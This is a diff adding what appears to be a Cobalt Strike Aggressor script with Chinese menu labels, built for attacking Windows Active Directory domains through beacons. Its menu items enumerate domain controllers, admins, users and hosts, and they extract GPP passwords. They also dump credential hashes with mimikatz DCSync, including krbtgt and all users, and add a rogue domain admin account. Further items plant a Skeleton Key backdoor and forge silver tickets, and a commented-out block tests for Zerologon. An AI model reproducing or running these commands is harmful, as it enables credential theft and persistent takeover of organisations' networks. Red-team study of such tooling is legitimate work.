@@ -1,0 +1,181 @@
+menu "域渗透" {
+	item "查找域控" {
+		blog($1, "-------------------------------------------------------------查找域控-------------------------------------------------------------");
+		bshell($1, 'net group "domain controllers" /domain');
+	}
+	item "查找域管理员" {
+		blog($1, "-------------------------------------------------------------查找域管理员------------------------------------------------------------");
+		bshell($1, 'net group "domain admins" /domain');
+	}
+	item "统计域内用户数量" {
+		blog($1, "-------------------------------------------------------------统计域内用户数量------------------------------------------------------------");
+		bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+		bpowerpick($1, "Get-NetUser | select name | measure | findstr Count");
+		bpowerpick($1, "Get-NetUser | select name");
+	}
+	item "统计域内主机数量" {
+		blog($1, "-------------------------------------------------------------统计域内主机数量------------------------------------------------------------");
+		bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+		bpowerpick($1, "Get-NetComputer | measure | findstr Count");
+		bpowerpick($1, "Get-NetComputer");
+	}
+	item "查看域信任关系" {
+		blog($1, "-------------------------------------------------------------查看域信任关系------------------------------------------------------------");
+		bshell($1, 'nltest  /domain_trusts');
+	}
+	item "获取GPP组策略凭据" {
+		blog($1, "-------------------------------------------------------------获取GPP组策略凭据------------------------------------------------------------");
+		bexecute_assembly($1, script_resource('/exe/Net-GPPPassword.exe'));
+	}
+	menu "导出hash" {
+		item "导出域内指定用户hash" {
+	    	local('$bid');
+	        foreach $bid ($1){
+	        	blog($1, "-------------------------------------------------------------导出域内指定用户hash------------------------------------------------------------");
+	            mimikatz_bdcsync($bid);
+	        }
+		}
+		sub mimikatz_bdcsync{
+			blog($bid, "-----------------------------------------导出域内指定用户hash--------------------------------------------------");
+			$bid = $1;	
+			$dialog = dialog("DomainInfo" , %(beacon => $1 , domain => "xie.com" , user => "krbtgt") , lambda({
+				bdcsync($3["beacon"] , $3["domain"] , $3["user"])
+			}));
+			dialog_description($dialog, "使用条件：需要域管理员权限"); 
+			drow_text($dialog, "domain", "Domain:");
+			drow_text($dialog, "user", "User:");
+			dbutton_action($dialog, "Launch");
+			dialog_show($dialog);
+		}
+		item "导出域内所有用户hash" {
+			$bid = $1['@'];
+			$dialog = dialog("导出域内所有用户hash", %(domain => "xie.com",bid => $bid), &mimikatz_all);
+			dialog_description($dialog, "使用条件：需要域管理员权限");
+			drow_text($dialog, "domain", "域名:  ");
+			dbutton_action($dialog, "导出");
+			dialog_show($dialog);
+		}
+		sub mimikatz_all {
+			blog($bid, "-----------------------------------------导出域内所有用户hash--------------------------------------------------");
+			bmimikatz($bid, "lsadump::dcsync /domain:$3['domain'] /all /csv");
+		}
+	}
+    item "添加域管理员"{
+        $bid = $1['@'];
+        $Dialog = dialog("添加域管",%(username => "test",passsword => "P@ss123",bid => $bid),&domain_user);
+        dialog_description($Dialog, "注意下账户策略中:密码复杂度"); #介绍
+        drow_text($Dialog, "username", "username: ");
+        drow_text($Dialog, "passsword", "passsword: ");
+        dbutton_action($Dialog, "运行");
+        dialog_show($Dialog);
+    }
+    sub domain_user{
+    	blog($bid, "-----------------------------------------添加域管理员--------------------------------------------------");
+    	local('$Name');
+    	$Name = $3['username'];
+    	$Pwd = $3['passsword'];
+    	bshell($bid, "net user $Name $Pwd /add /domain && net group \"Domain Admins\"  $Name  /add /domain ");	
+    	blog($bid, "域管理员添加成功，用户名：$Name  密码：$Pwd");			
+	}
+	menu "PVEFindADUser"{
+		item "上传PVEFindADUser" {
+			$bid = $1;
+	        $dialog = dialog("上传PVEFindADUser.exe", %(UploadPath => "", bid => $bid), &upload_PVEFindADUser);
+	        drow_text($dialog, "UploadPath",  "上传路径: ");    
+	        dbutton_action($dialog, "上传");
+	        dialog_show($dialog);
+		}
+	 	sub upload_PVEFindADUser{
+			bupload($bid, script_resource("/exe/PVEFindADUser.exe"));
+		}
+		menu "探测"{
+			item "查询域中所有主机当前的登录用户"{
+				blog($1, "-----------------------------------------查询域中所有主机当前的登录用户-----------------------------------");
+				bshell($1, "PVEFindADUser.exe -current");
+			}
+			item "查询指定用户当前登录的主机"{
+				blog($1, "-----------------------------------------查询指定用户当前登录的主机-----------------------------------");
+				prompt_text("输入指定用户：", "xie\\hack", lambda({ bshell(@ids, "PVEFindADUser.exe -current $1"); }, @ids => $1));
+			}
+			item "查询指定主机当前登录的用户"{
+				blog($1, "-----------------------------------------查询指定主机当前登录的用户-----------------------------------");
+				prompt_text("输入指定主机：", "192.168.10.11", lambda({ bshell(@ids, "PVEFindADUser.exe -current -target $1"); }, @ids => $1));
+			}
+		}
+	 	item "删除PVEFindADUser.exe"{
+	 		blog($1, "-----------------------------------------删除PVEFindADUser.exe-----------------------------------");
+	        bshell($1, "del /f /s /q PVEFindADUser.exe");
+	 	}
+	}
+	# menu "判断是否存在Netlogon(CVE-2020-1472)漏洞" {
+	# 		item "上传zerologon_tester.exe"{
+	#             $bid = $1;
+	#             $dialog = dialog("上传zerologon_tester.exe", %(UploadPath => "", bid => $bid), &upload_zerologon_tester);
+	#             drow_text($dialog, "UploadPath",  "上传路径: ");    
+	#             dbutton_action($dialog, "上传");
+	#             dialog_show($dialog);
+	# 		}
+	# 		sub upload_zerologon_tester {
+	# 		    bupload($bid, script_resource("/exe/zerologon_tester.exe"));
+	# 		}
+	# 		item "检测" {
+	# 			$bid = $1['@'];
+	# 			$dialog = dialog("Netlogon", %(hostname => "win2008", ip => "192.168.10.131", bid => $bid), &netlogon_test);
+	# 			dialog_description($dialog, "此功能用于探测目标域控是否存在Netlogon(CVE-2020-1472)漏洞！");
+	# 			drow_text($dialog, "hostname", "域控主机名:  ");
+	# 			drow_text($dialog, "ip", "域控IP:  ");
+	# 			dbutton_action($dialog, "检测");
+	# 			dialog_show($dialog);
+	# 		}
+	# 		sub netlogon_test {
+	# 			blog($bid, "-----------------------------------------检测域控是否存在Netlogon(CVE-2020-1472)漏洞--------------------------------------------------");
+	# 			bshell($bid, "zerologon_tester.exe $3['hostname'] $3['ip']");
+	# 		}
+	# 		item "删除zerologon_tester.exe"{
+	#         	local('$bid');
+	#         	foreach $bid ($1){
+	#             	bshell($1, "del /f /s /q zerologon_tester.exe");
+	#             }
+	# 		}
+	# }
+	menu "域控权限持久化" {
+    	item "Skeleton(万能密码)"{
+    		blog($1, "-----------------------------------------Skeleton Key万能密码--------------------------------------------------");
+    		blog($1, "域内所有账号中添加万能密码：mimikatz");
+    		local('$bid');
+            foreach $bid ($1){
+            	mimikatz_skeleton($1);
+            }
+    	}
+	    sub mimikatz_skeleton{
+			bmimikatz($1 , "misc::skeleton");
+		}
+		item "白银票据" {
+	        $dialog = dialog("白银票据", %(user => "user" , id => "500" , domain => "domain" , sid => "sid" , target => "DC-waf.com" , rc4 => "NTLM" , service => "cifs"), &baiyin);
+	        dialog_description($dialog, "白银票据利用: 攻击者必须获得目标服务账号的密码hash值"); #介绍
+	        drow_text($dialog, "user", "伪造用户名: "); #文本
+	        drow_text($dialog, "id", "id值: "); #文本
+	        drow_text($dialog, "domain", "域名: "); #文本
+	        drow_text($dialog, "sid", "sid: "); #文本
+	        drow_text($dialog, "target", "目标主机名: "); #文本
+	        drow_text($dialog, "rc4", "hash(NTLM): "); #文本
+	        drow_text($dialog, "service", "伪造的服务: "); #文本  
+	        dbutton_action($dialog, "开始"); #按钮
+			dialog_show($dialog);
+		    local('$bid');
+		    foreach $bid ($1){
+		        $beaconid = $1;
+		    }
+		}
+		sub baiyin {
+		      $user = $3["user"];
+		      $id = $3["id"];
+		      $domain = $3["domain"];
+		      $sid = $3["sid"];
+		      $target = $3["target"];
+		      $rc4 = $3["rc4"];
+		      $service = $3["service"];
+		      bmimikatz($beaconid, "kerberos::golden /user:$user /id:$id /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /ptt exit");
+		}
+	}
+}
